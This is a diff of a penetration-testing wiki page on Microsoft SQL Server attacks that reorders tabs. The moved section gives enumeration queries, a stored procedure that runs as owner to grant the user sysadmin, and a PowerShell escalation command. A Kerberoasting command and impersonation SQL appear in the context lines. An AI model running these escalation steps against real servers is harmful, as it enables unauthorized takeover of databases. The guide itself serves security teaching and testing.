@@ -57,8 +57,6 @@ GetUserSPNs.py -dc-ip <DC_IP> '<DOMAIN>/<USER>:<Password>'
 {% endtab %}
 {% endtabs %}
 
-
-
 ### Enumerate DB Objects
 
 To enumerate Databases, Tables, Columns, Users, Permissions, refers to the following page
@@ -190,58 +188,6 @@ On MS-SQL (Microsoft SQL) servers, the EXEC method can be used to access a remot
 ### MSSQL Privilege Escalation
 
 {% tabs %}
-{% tab title="db_owner to sysadmin" %}
-If a **regular user** is given the role **`db_owner`** over the **database owned by an admin** user (such as **`sa`**) and that database is configured as **`trustworthy`**, that user can abuse these privileges to **privesc** because **stored procedures** created in there that can **execute** as the owner (**admin**).
-
-### Windows
-
-To enumerate, run the following queries
-
-```sql
-# Get owners of databases
-SELECT suser_sname(owner_sid) FROM sys.databases
-
-# Find trustworthy databases
-SELECT a.name,b.is_trustworthy_on
-FROM master..sysdatabases as a
-INNER JOIN sys.databases as b
-ON a.name=b.name;
-
-# Get roles over the selected database (look for your username as db_owner)
-USE <trustworthy_db>
-SELECT rp.name as database_role, mp.name as database_user
-from sys.database_role_members drm
-join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
-join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
-```
-
-If you found you are db\_owner of a trustworthy database, you can privesc
-
-```sql
---1. Create a stored procedure to add your user to sysadmin role
-USE <trustworthy_db>
-
-CREATE PROCEDURE sp_elevate_me
-WITH EXECUTE AS OWNER
-AS
-EXEC sp_addsrvrolemember 'USERNAME','sysadmin'
-
---2. Execute stored procedure to get sysadmin role
-USE <trustworthy_db>
-EXEC sp_elevate_me
-
---3. Verify your user is a sysadmin
-SELECT is_srvrolemember('sysadmin')
-```
-
-Otherwise, we can use [Invoke-SqlServerDbElevateDbOwner](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1) powershell script to automate the exploit
-
-```powershell
-Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
-Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
-```
-{% endtab %}
-
 {% tab title="Impersonate" %}
 SQL Server has a special permission, named **`IMPERSONATE`**, that **allows the executing user to take on the permissions of another user** or login until the context is reset or the session ends.
 
@@ -299,6 +245,58 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 -- Change back to sa
 REVERT
+```
+{% endtab %}
+
+{% tab title="db_owner to sysadmin" %}
+If a **regular user** is given the role **`db_owner`** over the **database owned by an admin** user (such as **`sa`**) and that database is configured as **`trustworthy`**, that user can abuse these privileges to **privesc** because **stored procedures** created in there that can **execute** as the owner (**admin**).
+
+### Windows
+
+To enumerate, run the following queries
+
+```sql
+# Get owners of databases
+SELECT suser_sname(owner_sid) FROM sys.databases
+
+# Find trustworthy databases
+SELECT a.name,b.is_trustworthy_on
+FROM master..sysdatabases as a
+INNER JOIN sys.databases as b
+ON a.name=b.name;
+
+# Get roles over the selected database (look for your username as db_owner)
+USE <trustworthy_db>
+SELECT rp.name as database_role, mp.name as database_user
+from sys.database_role_members drm
+join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
+join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
+```
+
+If you found you are db\_owner of a trustworthy database, you can privesc
+
+```sql
+--1. Create a stored procedure to add your user to sysadmin role
+USE <trustworthy_db>
+
+CREATE PROCEDURE sp_elevate_me
+WITH EXECUTE AS OWNER
+AS
+EXEC sp_addsrvrolemember 'USERNAME','sysadmin'
+
+--2. Execute stored procedure to get sysadmin role
+USE <trustworthy_db>
+EXEC sp_elevate_me
+
+--3. Verify your user is a sysadmin
+SELECT is_srvrolemember('sysadmin')
+```
+
+Otherwise, we can use [Invoke-SqlServerDbElevateDbOwner](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1) powershell script to automate the exploit
+
+```powershell
+Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
+Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
 ```
 {% endtab %}
 {% endtabs %}
